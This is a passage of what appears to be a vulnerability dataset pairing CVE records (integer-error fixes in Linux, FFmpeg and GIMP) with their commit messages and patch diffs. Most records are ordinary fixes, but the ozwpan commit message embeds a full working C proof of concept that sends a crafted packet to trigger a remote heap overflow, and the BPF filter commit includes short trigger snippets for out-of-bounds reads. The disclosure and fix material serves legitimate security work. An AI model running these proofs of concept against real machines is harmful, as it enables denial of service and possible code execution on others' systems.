\t\/* Clear MAC statistics *\/\n \tefx->mac_op->update_stats(efx);\ndiff --git a\/drivers\/net\/ethernet\/sfc\/efx.h b\/drivers\/net\/ethernet\/sfc\/efx.h\nindex 4764793ed234c..1355245b4da86 100644\n--- a\/drivers\/net\/ethernet\/sfc\/efx.h\n+++ b\/drivers\/net\/ethernet\/sfc\/efx.h\n@@ -34,6 +34,7 @@ extern netdev_tx_t\n efx_enqueue_skb(struct efx_tx_queue *tx_queue, struct sk_buff *skb);\n extern void efx_xmit_done(struct efx_tx_queue *tx_queue, unsigned int index);\n extern int efx_setup_tc(struct net_device *net_dev, u8 num_tc);\n+extern unsigned int efx_tx_max_skb_descs(struct efx_nic *efx);\n \n \/* RX *\/\n extern int efx_probe_rx_queue(struct efx_rx_queue *rx_queue);\n@@ -56,10 +57,15 @@ extern void efx_schedule_slow_fill(struct efx_rx_queue *rx_queue);\n #define EFX_MAX_EVQ_SIZE 16384UL\n #define EFX_MIN_EVQ_SIZE 512UL\n \n-\/* The smallest [rt]xq_entries that the driver supports. Callers of\n- * efx_wake_queue() assume that they can subsequently send at least one\n- * skb. Falcon\/A1 may require up to three descriptors per skb_frag. *\/\n-#define EFX_MIN_RING_SIZE (roundup_pow_of_two(2 * 3 * MAX_SKB_FRAGS))\n+\/* Maximum number of TCP segments we support for soft-TSO *\/\n+#define EFX_TSO_MAX_SEGS\t100\n+\n+\/* The smallest [rt]xq_entries that the driver supports.  RX minimum\n+ * is a bit arbitrary.  For TX, we must have space for at least 2\n+ * TSO skbs.\n+ *\/\n+#define EFX_RXQ_MIN_ENT\t\t128U\n+#define EFX_TXQ_MIN_ENT(efx)\t(2 * efx_tx_max_skb_descs(efx))\n \n \/* Filters *\/\n extern int efx_probe_filters(struct efx_nic *efx);\ndiff --git a\/drivers\/net\/ethernet\/sfc\/ethtool.c b\/drivers\/net\/ethernet\/sfc\/ethtool.c\nindex f3cd96dfa398f..90158c913fb06 100644\n--- a\/drivers\/net\/ethernet\/sfc\/ethtool.c\n+++ b\/drivers\/net\/ethernet\/sfc\/ethtool.c\n@@ -690,21 +690,27 @@ static int efx_ethtool_set_ringparam(struct net_device *net_dev,\n \t\t\t\t     struct ethtool_ringparam *ring)\n {\n \tstruct efx_nic *efx = netdev_priv(net_dev);\n+\tu32 txq_entries;\n \n \tif (ring->rx_mini_pending || ring->rx_jumbo_pending ||\n \t    ring->rx_pending > EFX_MAX_DMAQ_SIZE ||\n \t    ring->tx_pending > EFX_MAX_DMAQ_SIZE)\n \t\treturn -EINVAL;\n \n-\tif (ring->rx_pending < EFX_MIN_RING_SIZE ||\n-\t    ring->tx_pending < EFX_MIN_RING_SIZE) {\n+\tif (ring->rx_pending < EFX_RXQ_MIN_ENT) {\n \t\tnetif_err(efx, drv, efx->net_dev,\n-\t\t\t  \"TX and RX queues cannot be smaller than %ld\\n\",\n-\t\t\t  EFX_MIN_RING_SIZE);\n+\t\t\t  \"RX queues cannot be smaller than %u\\n\",\n+\t\t\t  EFX_RXQ_MIN_ENT);\n \t\treturn -EINVAL;\n \t}\n \n-\treturn efx_realloc_channels(efx, ring->rx_pending, ring->tx_pending);\n+\ttxq_entries = max(ring->tx_pending, EFX_TXQ_MIN_ENT(efx));\n+\tif (txq_entries != ring->tx_pending)\n+\t\tnetif_warn(efx, drv, efx->net_dev,\n+\t\t\t   \"increasing TX queue size to minimum of %u\\n\",\n+\t\t\t   txq_entries);\n+\n+\treturn efx_realloc_channels(efx, ring->rx_pending, txq_entries);\n }\n \n static int efx_ethtool_set_pauseparam(struct net_device *net_dev,\ndiff --git a\/drivers\/net\/ethernet\/sfc\/nic.h b\/drivers\/net\/ethernet\/sfc\/nic.h\nindex 5fb24d3aa3caf..66ece48003441 100644\n--- a\/drivers\/net\/ethernet\/sfc\/nic.h\n+++ b\/drivers\/net\/ethernet\/sfc\/nic.h\n@@ -65,6 +65,9 @@ enum {\n #define FALCON_GMAC_LOOPBACKS\t\t\t\\\n \t(1 << LOOPBACK_GMAC)\n \n+\/* Alignment of PCIe DMA boundaries (4KB) *\/\n+#define EFX_PAGE_SIZE\t4096\n+\n \/**\n  * struct falcon_board_type - board operations and type information\n  * @id: Board type id, as found in NVRAM\ndiff --git a\/drivers\/net\/ethernet\/sfc\/tx.c b\/drivers\/net\/ethernet\/sfc\/tx.c\nindex df88c5430f956..807d515318e91 100644\n--- a\/drivers\/net\/ethernet\/sfc\/tx.c\n+++ b\/drivers\/net\/ethernet\/sfc\/tx.c\n@@ -115,6 +115,25 @@ efx_max_tx_len(struct efx_nic *efx, dma_addr_t dma_addr)\n \treturn len;\n }\n \n+unsigned int efx_tx_max_skb_descs(struct efx_nic *efx)\n+{\n+\t\/* Header and payload descriptor for each output segment, plus\n+\t * one for every input fragment boundary within a segment\n+\t *\/\n+\tunsigned int max_descs = EFX_TSO_MAX_SEGS * 2 + MAX_SKB_FRAGS;\n+\n+\t\/* Possibly one more per segment for the alignment workaround *\/\n+\tif (EFX_WORKAROUND_5391(efx))\n+\t\tmax_descs += EFX_TSO_MAX_SEGS;\n+\n+\t\/* Possibly more for PCIe page boundaries within input fragments *\/\n+\tif (PAGE_SIZE > EFX_PAGE_SIZE)\n+\t\tmax_descs += max_t(unsigned int, MAX_SKB_FRAGS,\n+\t\t\t\t   DIV_ROUND_UP(GSO_MAX_SIZE, EFX_PAGE_SIZE));\n+\n+\treturn max_descs;\n+}\n+\n \/*\n  * Add a socket buffer to a TX queue\n  *\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2010-2538","CWE_ID":"189","category":"security","commit_id":"2ebc3464781ad24474abcbd2274e6254689853b5","commit_message":"From 2ebc3464781ad24474abcbd2274e6254689853b5 Mon Sep 17 00:00:00 2001\nFrom: Dan Rosenberg <dan.j.rosenberg@gmail.com>\nDate: Mon, 19 Jul 2010 16:58:20 -0400\nSubject: Btrfs: fix checks in BTRFS_IOC_CLONE_RANGE\n\n1.  The BTRFS_IOC_CLONE and BTRFS_IOC_CLONE_RANGE ioctls should check\nwhether the donor file is append-only before writing to it.\n\n2.  The BTRFS_IOC_CLONE_RANGE ioctl appears to have an integer\noverflow that allows a user to specify an out-of-bounds range to copy\nfrom the source file (if off + len wraps around).  I haven't been able\nto successfully exploit this, but I'd imagine that a clever attacker\ncould use this to read things he shouldn't.  Even if it's not\nexploitable, it couldn't hurt to be safe.\n\nSigned-off-by: Dan Rosenberg <dan.j.rosenberg@gmail.com>\ncc: stable@kernel.org\nSigned-off-by: Chris Mason <chris.mason@oracle.com>\n---\n fs\/btrfs\/ioctl.c | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/fs\/btrfs\/ioctl.c b\/fs\/btrfs\/ioctl.c\nindex 2a8b3a7568ad..9254b3d58dbe 100644\n--- a\/fs\/btrfs\/ioctl.c\n+++ b\/fs\/btrfs\/ioctl.c\n@@ -1458,7 +1458,7 @@ static noinline long btrfs_ioctl_clone(struct file *file, unsigned long srcfd,\n \t *\/\n \n \t\/* the destination must be opened for writing *\/\n-\tif (!(file->f_mode & FMODE_WRITE))\n+\tif (!(file->f_mode & FMODE_WRITE) || (file->f_flags & O_APPEND))\n \t\treturn -EINVAL;\n \n \tret = mnt_want_write(file->f_path.mnt);\n@@ -1511,7 +1511,7 @@ static noinline long btrfs_ioctl_clone(struct file *file, unsigned long srcfd,\n \n \t\/* determine range to clone *\/\n \tret = -EINVAL;\n-\tif (off >= src->i_size || off + len > src->i_size)\n+\tif (off + len > src->i_size || off + len < off)\n \t\tgoto out_unlock;\n \tif (len == 0)\n \t\tolen = len = src->i_size - off;\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-8546","CWE_ID":"189","category":"security","commit_id":"e7e5114c506957f40aafd794e06de1a7e341e9d5","commit_message":"From e7e5114c506957f40aafd794e06de1a7e341e9d5 Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Fri, 3 Oct 2014 19:33:01 +0200\nSubject: [PATCH] avcodec\/cinepak: fix integer underflow\n\nFixes out of array access\nFixes: asan_heap-oob_4da0ba_6_asan_heap-oob_4da0ba_241_cvid_crash.avi\n\nFound-by: Mateusz \"j00ru\" Jurczyk and Gynvael Coldwind\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n---\n libavcodec\/cinepak.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/libavcodec\/cinepak.c b\/libavcodec\/cinepak.c\nindex 4746289b76..f651c489bf 100644\n--- a\/libavcodec\/cinepak.c\n+++ b\/libavcodec\/cinepak.c\n@@ -135,7 +135,7 @@ static int cinepak_decode_vectors (CinepakContext *s, cvid_strip *strip,\n     const uint8_t   *eod = (data + size);\n     uint32_t         flag, mask;\n     uint8_t         *cb0, *cb1, *cb2, *cb3;\n-    unsigned int     x, y;\n+    int             x, y;\n     char            *ip0, *ip1, *ip2, *ip3;\n \n     flag = 0;\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2015-4001","CWE_ID":"189","category":"security","commit_id":"b1bb5b49373b61bf9d2c73a4d30058ba6f069e4c","commit_message":"From b1bb5b49373b61bf9d2c73a4d30058ba6f069e4c Mon Sep 17 00:00:00 2001\nFrom: \"Jason A. Donenfeld\" <Jason@zx2c4.com>\nDate: Fri, 29 May 2015 13:06:59 +0200\nSubject: [PATCH] ozwpan: Use unsigned ints to prevent heap overflow\n\nUsing signed integers, the subtraction between required_size and offset\ncould wind up being negative, resulting in a memcpy into a heap buffer\nwith a negative length, resulting in huge amounts of network-supplied\ndata being copied into the heap, which could potentially lead to remote\ncode execution.. This is remotely triggerable with a magic packet.\nA PoC which obtains DoS follows below. It requires the ozprotocol.h file\nfrom this module.\n\n=-=-=-=-=-=\n\n #include <arpa\/inet.h>\n #include <linux\/if_packet.h>\n #include <net\/if.h>\n #include <netinet\/ether.h>\n #include <stdio.h>\n #include <string.h>\n #include <stdlib.h>\n #include <endian.h>\n #include <sys\/ioctl.h>\n #include <sys\/socket.h>\n\n #define u8 uint8_t\n #define u16 uint16_t\n #define u32 uint32_t\n #define __packed __attribute__((__packed__))\n #include \"ozprotocol.h\"\n\nstatic int hex2num(char c)\n{\n\tif (c >= '0' && c <= '9')\n\t\treturn c - '0';\n\tif (c >= 'a' && c <= 'f')\n\t\treturn c - 'a' + 10;\n\tif (c >= 'A' && c <= 'F')\n\t\treturn c - 'A' + 10;\n\treturn -1;\n}\nstatic int hwaddr_aton(const char *txt, uint8_t *addr)\n{\n\tint i;\n\tfor (i = 0; i < 6; i++) {\n\t\tint a, b;\n\t\ta = hex2num(*txt++);\n\t\tif (a < 0)\n\t\t\treturn -1;\n\t\tb = hex2num(*txt++);\n\t\tif (b < 0)\n\t\t\treturn -1;\n\t\t*addr++ = (a << 4) | b;\n\t\tif (i < 5 && *txt++ != ':')\n\t\t\treturn -1;\n\t}\n\treturn 0;\n}\n\nint main(int argc, char *argv[])\n{\n\tif (argc < 3) {\n\t\tfprintf(stderr, \"Usage: %s interface destination_mac\\n\", argv[0]);\n\t\treturn 1;\n\t}\n\n\tuint8_t dest_mac[6];\n\tif (hwaddr_aton(argv[2], dest_mac)) {\n\t\tfprintf(stderr, \"Invalid mac address.\\n\");\n\t\treturn 1;\n\t}\n\n\tint sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);\n\tif (sockfd < 0) {\n\t\tperror(\"socket\");\n\t\treturn 1;\n\t}\n\n\tstruct ifreq if_idx;\n\tint interface_index;\n\tstrncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);\n\tif (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {\n\t\tperror(\"SIOCGIFINDEX\");\n\t\treturn 1;\n\t}\n\tinterface_index = if_idx.ifr_ifindex;\n\tif (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {\n\t\tperror(\"SIOCGIFHWADDR\");\n\t\treturn 1;\n\t}\n\tuint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;\n\n\tstruct {\n\t\tstruct ether_header ether_header;\n\t\tstruct oz_hdr oz_hdr;\n\t\tstruct oz_elt oz_elt;\n\t\tstruct oz_elt_connect_req oz_elt_connect_req;\n\t} __packed connect_packet = {\n\t\t.ether_header = {\n\t\t\t.ether_type = htons(OZ_ETHERTYPE),\n\t\t\t.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },\n\t\t\t.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }\n\t\t},\n\t\t.oz_hdr = {\n\t\t\t.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),\n\t\t\t.last_pkt_num = 0,\n\t\t\t.pkt_num = htole32(0)\n\t\t},\n\t\t.oz_elt = {\n\t\t\t.type = OZ_ELT_CONNECT_REQ,\n\t\t\t.length = sizeof(struct oz_elt_connect_req)\n\t\t},\n\t\t.oz_elt_connect_req = {\n\t\t\t.mode = 0,\n\t\t\t.resv1 = {0},\n\t\t\t.pd_info = 0,\n\t\t\t.session_id = 0,\n\t\t\t.presleep = 35,\n\t\t\t.ms_isoc_latency = 0,\n\t\t\t.host_vendor = 0,\n\t\t\t.keep_alive = 0,\n\t\t\t.apps = htole16((1 << OZ_APPID_USB) | 0x1),\n\t\t\t.max_len_div16 = 0,\n\t\t\t.ms_per_isoc = 0,\n\t\t\t.up_audio_buf = 0,\n\t\t\t.ms_per_elt = 0\n\t\t}\n\t};\n\n\tstruct {\n\t\tstruct ether_header ether_header;\n\t\tstruct oz_hdr oz_hdr;\n\t\tstruct oz_elt oz_elt;\n\t\tstruct oz_get_desc_rsp oz_get_desc_rsp;\n\t} __packed pwn_packet = {\n\t\t.ether_header = {\n\t\t\t.ether_type = htons(OZ_ETHERTYPE),\n\t\t\t.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },\n\t\t\t.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }\n\t\t},\n\t\t.oz_hdr = {\n\t\t\t.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),\n\t\t\t.last_pkt_num = 0,\n\t\t\t.pkt_num = htole32(1)\n\t\t},\n\t\t.oz_elt = {\n\t\t\t.type = OZ_ELT_APP_DATA,\n\t\t\t.length = sizeof(struct oz_get_desc_rsp)\n\t\t},\n\t\t.oz_get_desc_rsp = {\n\t\t\t.app_id = OZ_APPID_USB,\n\t\t\t.elt_seq_num = 0,\n\t\t\t.type = OZ_GET_DESC_RSP,\n\t\t\t.req_id = 0,\n\t\t\t.offset = htole16(2),\n\t\t\t.total_size = htole16(1),\n\t\t\t.rcode = 0,\n\t\t\t.data = {0}\n\t\t}\n\t};\n\n\tstruct sockaddr_ll socket_address = {\n\t\t.sll_ifindex = interface_index,\n\t\t.sll_halen = ETH_ALEN,\n\t\t.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }\n\t};\n\n\tif (sendto(sockfd, &connect_packet, sizeof(connect_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {\n\t\tperror(\"sendto\");\n\t\treturn 1;\n\t}\n\tusleep(300000);\n\tif (sendto(sockfd, &pwn_packet, sizeof(pwn_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {\n\t\tperror(\"sendto\");\n\t\treturn 1;\n\t}\n\treturn 0;\n}\n\nSigned-off-by: Jason A. Donenfeld <Jason@zx2c4.com>\nAcked-by: Dan Carpenter <dan.carpenter@oracle.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>\n---\n drivers\/staging\/ozwpan\/ozhcd.c   | 8 ++++----\n drivers\/staging\/ozwpan\/ozusbif.h | 4 ++--\n 2 files changed, 6 insertions(+), 6 deletions(-)\n\n","diff_code":"diff --git a\/drivers\/staging\/ozwpan\/ozhcd.c b\/drivers\/staging\/ozwpan\/ozhcd.c\nindex 5ff4716b72c31..784b5ecfa8493 100644\n--- a\/drivers\/staging\/ozwpan\/ozhcd.c\n+++ b\/drivers\/staging\/ozwpan\/ozhcd.c\n@@ -746,8 +746,8 @@ void oz_hcd_pd_reset(void *hpd, void *hport)\n \/*\n  * Context: softirq\n  *\/\n-void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status, const u8 *desc,\n-\t\t\tint length, int offset, int total_size)\n+void oz_hcd_get_desc_cnf(void *hport, u8 req_id, u8 status, const u8 *desc,\n+\t\t\tu8 length, u16 offset, u16 total_size)\n {\n \tstruct oz_port *port = hport;\n \tstruct urb *urb;\n@@ -759,8 +759,8 @@ void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status, const u8 *desc,\n \tif (!urb)\n \t\treturn;\n \tif (status == 0) {\n-\t\tint copy_len;\n-\t\tint required_size = urb->transfer_buffer_length;\n+\t\tunsigned int copy_len;\n+\t\tunsigned int required_size = urb->transfer_buffer_length;\n \n \t\tif (required_size > total_size)\n \t\t\trequired_size = total_size;\ndiff --git a\/drivers\/staging\/ozwpan\/ozusbif.h b\/drivers\/staging\/ozwpan\/ozusbif.h\nindex 4249fa3740128..d2a6085345bec 100644\n--- a\/drivers\/staging\/ozwpan\/ozusbif.h\n+++ b\/drivers\/staging\/ozwpan\/ozusbif.h\n@@ -29,8 +29,8 @@ void oz_usb_request_heartbeat(void *hpd);\n \n \/* Confirmation functions.\n  *\/\n-void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status,\n-\tconst u8 *desc, int length, int offset, int total_size);\n+void oz_hcd_get_desc_cnf(void *hport, u8 req_id, u8 status,\n+\tconst u8 *desc, u8 length, u16 offset, u16 total_size);\n void oz_hcd_control_cnf(void *hport, u8 req_id, u8 rcode,\n \tconst u8 *data, int data_len);\n \n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2010-3859","CWE_ID":"189","category":"security","commit_id":"8acfe468b0384e834a303f08ebc4953d72fb690a","commit_message":"From 8acfe468b0384e834a303f08ebc4953d72fb690a Mon Sep 17 00:00:00 2001\nFrom: \"David S. Miller\" <davem@davemloft.net>\nDate: Thu, 28 Oct 2010 11:41:55 -0700\nSubject: net: Limit socket I\/O iovec total length to INT_MAX.\n\nThis helps protect us from overflow issues down in the\nindividual protocol sendmsg\/recvmsg handlers.  Once\nwe hit INT_MAX we truncate out the rest of the iovec\nby setting the iov_len members to zero.\n\nThis works because:\n\n1) For SOCK_STREAM and SOCK_SEQPACKET sockets, partial\n   writes are allowed and the application will just continue\n   with another write to send the rest of the data.\n\n2) For datagram oriented sockets, where there must be a\n   one-to-one correspondance between write() calls and\n   packets on the wire, INT_MAX is going to be far larger\n   than the packet size limit the protocol is going to\n   check for and signal with -EMSGSIZE.\n\nBased upon a patch by Linus Torvalds.\n\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n include\/linux\/socket.h |  2 +-\n net\/compat.c           | 10 ++++++----\n net\/core\/iovec.c       | 20 +++++++++-----------\n 3 files changed, 16 insertions(+), 16 deletions(-)\n\n","diff_code":"diff --git a\/include\/linux\/socket.h b\/include\/linux\/socket.h\nindex 5146b50202ce..86b652fabf6e 100644\n--- a\/include\/linux\/socket.h\n+++ b\/include\/linux\/socket.h\n@@ -322,7 +322,7 @@ extern int csum_partial_copy_fromiovecend(unsigned char *kdata,\n \t\t\t\t\t  int offset, \n \t\t\t\t\t  unsigned int len, __wsum *csump);\n \n-extern long verify_iovec(struct msghdr *m, struct iovec *iov, struct sockaddr *address, int mode);\n+extern int verify_iovec(struct msghdr *m, struct iovec *iov, struct sockaddr *address, int mode);\n extern int memcpy_toiovec(struct iovec *v, unsigned char *kdata, int len);\n extern int memcpy_toiovecend(const struct iovec *v, unsigned char *kdata,\n \t\t\t     int offset, int len);\ndiff --git a\/net\/compat.c b\/net\/compat.c\nindex 63d260e81472..3649d5895361 100644\n--- a\/net\/compat.c\n+++ b\/net\/compat.c\n@@ -41,10 +41,12 @@ static inline int iov_from_user_compat_to_kern(struct iovec *kiov,\n \t\tcompat_size_t len;\n \n \t\tif (get_user(len, &uiov32->iov_len) ||\n-\t\t   get_user(buf, &uiov32->iov_base)) {\n-\t\t\ttot_len = -EFAULT;\n-\t\t\tbreak;\n-\t\t}\n+\t\t    get_user(buf, &uiov32->iov_base))\n+\t\t\treturn -EFAULT;\n+\n+\t\tif (len > INT_MAX - tot_len)\n+\t\t\tlen = INT_MAX - tot_len;\n+\n \t\ttot_len += len;\n \t\tkiov->iov_base = compat_ptr(buf);\n \t\tkiov->iov_len = (__kernel_size_t) len;\ndiff --git a\/net\/core\/iovec.c b\/net\/core\/iovec.c\nindex 72aceb1fe4fa..c40f27e7d208 100644\n--- a\/net\/core\/iovec.c\n+++ b\/net\/core\/iovec.c\n@@ -35,10 +35,9 @@\n  *\tin any case.\n  *\/\n \n-long verify_iovec(struct msghdr *m, struct iovec *iov, struct sockaddr *address, int mode)\n+int verify_iovec(struct msghdr *m, struct iovec *iov, struct sockaddr *address, int mode)\n {\n-\tint size, ct;\n-\tlong err;\n+\tint size, ct, err;\n \n \tif (m->msg_namelen) {\n \t\tif (mode == VERIFY_READ) {\n@@ -62,14 +61,13 @@ long verify_iovec(struct msghdr *m, struct iovec *iov, struct sockaddr *address,\n \terr = 0;\n \n \tfor (ct = 0; ct < m->msg_iovlen; ct++) {\n-\t\terr += iov[ct].iov_len;\n-\t\t\/*\n-\t\t * Goal is not to verify user data, but to prevent returning\n-\t\t * negative value, which is interpreted as errno.\n-\t\t * Overflow is still possible, but it is harmless.\n-\t\t *\/\n-\t\tif (err < 0)\n-\t\t\treturn -EMSGSIZE;\n+\t\tsize_t len = iov[ct].iov_len;\n+\n+\t\tif (len > INT_MAX - err) {\n+\t\t\tlen = INT_MAX - err;\n+\t\t\tiov[ct].iov_len = len;\n+\t\t}\n+\t\terr += len;\n \t}\n \n \treturn err;\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-3144","CWE_ID":"189","category":"security","commit_id":"05ab8f2647e4221cbdb3856dd7d32bd5407316b3","commit_message":"From 05ab8f2647e4221cbdb3856dd7d32bd5407316b3 Mon Sep 17 00:00:00 2001\nFrom: Mathias Krause <minipli@googlemail.com>\nDate: Sun, 13 Apr 2014 18:23:33 +0200\nSubject: filter: prevent nla extensions to peek beyond the end of the message\n\nThe BPF_S_ANC_NLATTR and BPF_S_ANC_NLATTR_NEST extensions fail to check\nfor a minimal message length before testing the supplied offset to be\nwithin the bounds of the message. This allows the subtraction of the nla\nheader to underflow and therefore -- as the data type is unsigned --\nallowing far to big offset and length values for the search of the\nnetlink attribute.\n\nThe remainder calculation for the BPF_S_ANC_NLATTR_NEST extension is\nalso wrong. It has the minuend and subtrahend mixed up, therefore\ncalculates a huge length value, allowing to overrun the end of the\nmessage while looking for the netlink attribute.\n\nThe following three BPF snippets will trigger the bugs when attached to\na UNIX datagram socket and parsing a message with length 1, 2 or 3.\n\n ,-[ PoC for missing size check in BPF_S_ANC_NLATTR ]--\n | ld\t#0x87654321\n | ldx\t#42\n | ld\t#nla\n | ret\ta\n `---\n\n ,-[ PoC for the same bug in BPF_S_ANC_NLATTR_NEST ]--\n | ld\t#0x87654321\n | ldx\t#42\n | ld\t#nlan\n | ret\ta\n `---\n\n ,-[ PoC for wrong remainder calculation in BPF_S_ANC_NLATTR_NEST ]--\n | ; (needs a fake netlink header at offset 0)\n | ld\t#0\n | ldx\t#42\n | ld\t#nlan\n | ret\ta\n `---\n\nFix the first issue by ensuring the message length fulfills the minimal\nsize constrains of a nla header. Fix the second bug by getting the math\nfor the remainder calculation right.\n\nFixes: 4738c1db15 (\"[SKFILTER]: Add SKF_ADF_NLATTR instruction\")\nFixes: d214c7537b (\"filter: add SKF_AD_NLATTR_NEST to look for nested..\")\nCc: Patrick McHardy <kaber@trash.net>\nCc: Pablo Neira Ayuso <pablo@netfilter.org>\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nAcked-by: Daniel Borkmann <dborkman@redhat.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net\/core\/filter.c | 8 +++++++-\n 1 file changed, 7 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/net\/core\/filter.c b\/net\/core\/filter.c\nindex e08b3822c72a..0e0856f5d708 100644\n--- a\/net\/core\/filter.c\n+++ b\/net\/core\/filter.c\n@@ -600,6 +600,9 @@ static u64 __skb_get_nlattr(u64 ctx, u64 A, u64 X, u64 r4, u64 r5)\n \tif (skb_is_nonlinear(skb))\n \t\treturn 0;\n \n+\tif (skb->len < sizeof(struct nlattr))\n+\t\treturn 0;\n+\n \tif (A > skb->len - sizeof(struct nlattr))\n \t\treturn 0;\n \n@@ -618,11 +621,14 @@ static u64 __skb_get_nlattr_nest(u64 ctx, u64 A, u64 X, u64 r4, u64 r5)\n \tif (skb_is_nonlinear(skb))\n \t\treturn 0;\n \n+\tif (skb->len < sizeof(struct nlattr))\n+\t\treturn 0;\n+\n \tif (A > skb->len - sizeof(struct nlattr))\n \t\treturn 0;\n \n \tnla = (struct nlattr *) &skb->data[A];\n-\tif (nla->nla_len > A - skb->len)\n+\tif (nla->nla_len > skb->len - A)\n \t\treturn 0;\n \n \tnla = nla_find_nested(nla, X);\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2009-3909","CWE_ID":"189","category":"security","commit_id":"0e440cb6d4d6ee029667363d244aff61b154c33c","commit_message":"From 0e440cb6d4d6ee029667363d244aff61b154c33c Mon Sep 17 00:00:00 2001\nFrom: Simon Budig <simon@gimp.org>\nDate: Tue, 17 Nov 2009 01:12:19 +0100\nSubject: [PATCH] Fix the PSD structs to use signed ints for bounding box\n coordinates.\n\n---\n plug-ins\/file-psd\/psd-load.c | 32 ++++++++++++++++----------------\n plug-ins\/file-psd\/psd.h      | 24 ++++++++++++------------\n 2 files changed, 28 insertions(+), 28 deletions(-)\n\n","diff_code":"diff --git a\/plug-ins\/file-psd\/psd-load.c b\/plug-ins\/file-psd\/psd-load.c\nindex 3e671856f9..63f8f01f95 100644\n--- a\/plug-ins\/file-psd\/psd-load.c\n+++ b\/plug-ins\/file-psd\/psd-load.c\n@@ -532,10 +532,10 @@ read_layer_block (PSDimage  *img_a,\n                   psd_set_error (feof (f), errno, error);\n                   return NULL;\n                 }\n-              lyr_a[lidx]->top = GUINT32_FROM_BE (lyr_a[lidx]->top);\n-              lyr_a[lidx]->left = GUINT32_FROM_BE (lyr_a[lidx]->left);\n-              lyr_a[lidx]->bottom = GUINT32_FROM_BE (lyr_a[lidx]->bottom);\n-              lyr_a[lidx]->right = GUINT32_FROM_BE (lyr_a[lidx]->right);\n+              lyr_a[lidx]->top = GINT32_FROM_BE (lyr_a[lidx]->top);\n+              lyr_a[lidx]->left = GINT32_FROM_BE (lyr_a[lidx]->left);\n+              lyr_a[lidx]->bottom = GINT32_FROM_BE (lyr_a[lidx]->bottom);\n+              lyr_a[lidx]->right = GINT32_FROM_BE (lyr_a[lidx]->right);\n               lyr_a[lidx]->num_channels = GUINT16_FROM_BE (lyr_a[lidx]->num_channels);\n \n               if (lyr_a[lidx]->num_channels > MAX_CHANNELS)\n@@ -669,13 +669,13 @@ read_layer_block (PSDimage  *img_a,\n                         return NULL;\n                       }\n                     lyr_a[lidx]->layer_mask.top =\n-                      GUINT32_FROM_BE (lyr_a[lidx]->layer_mask.top);\n+                      GINT32_FROM_BE (lyr_a[lidx]->layer_mask.top);\n                     lyr_a[lidx]->layer_mask.left =\n-                      GUINT32_FROM_BE (lyr_a[lidx]->layer_mask.left);\n+                      GINT32_FROM_BE (lyr_a[lidx]->layer_mask.left);\n                     lyr_a[lidx]->layer_mask.bottom =\n-                      GUINT32_FROM_BE (lyr_a[lidx]->layer_mask.bottom);\n+                      GINT32_FROM_BE (lyr_a[lidx]->layer_mask.bottom);\n                     lyr_a[lidx]->layer_mask.right =\n-                      GUINT32_FROM_BE (lyr_a[lidx]->layer_mask.right);\n+                      GINT32_FROM_BE (lyr_a[lidx]->layer_mask.right);\n                     lyr_a[lidx]->layer_mask.mask_flags.relative_pos =\n                       lyr_a[lidx]->layer_mask.flags & 1 ? TRUE : FALSE;\n                     lyr_a[lidx]->layer_mask.mask_flags.disabled =\n@@ -701,21 +701,21 @@ read_layer_block (PSDimage  *img_a,\n                         return NULL;\n                       }\n                     lyr_a[lidx]->layer_mask_extra.top =\n-                      GUINT32_FROM_BE (lyr_a[lidx]->layer_mask_extra.top);\n+                      GINT32_FROM_BE (lyr_a[lidx]->layer_mask_extra.top);\n                     lyr_a[lidx]->layer_mask_extra.left =\n-                      GUINT32_FROM_BE (lyr_a[lidx]->layer_mask_extra.left);\n+                      GINT32_FROM_BE (lyr_a[lidx]->layer_mask_extra.left);\n                     lyr_a[lidx]->layer_mask_extra.bottom =\n-                      GUINT32_FROM_BE (lyr_a[lidx]->layer_mask_extra.bottom);\n+                      GINT32_FROM_BE (lyr_a[lidx]->layer_mask_extra.bottom);\n                     lyr_a[lidx]->layer_mask_extra.right =\n-                      GUINT32_FROM_BE (lyr_a[lidx]->layer_mask_extra.right);\n+                      GINT32_FROM_BE (lyr_a[lidx]->layer_mask_extra.right);\n                     